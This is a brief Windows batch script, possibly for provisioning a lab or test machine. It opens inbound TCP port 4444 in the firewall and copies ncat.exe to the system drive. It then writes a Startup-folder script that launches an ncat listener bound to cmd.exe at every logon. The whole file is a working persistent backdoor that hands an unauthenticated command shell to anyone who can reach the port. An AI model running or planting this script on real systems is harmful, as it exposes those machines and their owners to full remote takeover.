@echo off

netsh advfirewall firewall add rule name="4444/tcp" dir=in action=allow protocol=TCP localport=4444

copy c:\OEM\ncat.exe c:\ncat.exe

echo c:\ncat.exe -k -lvnp 4444 -e cmd.exe > "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\listener.bat"

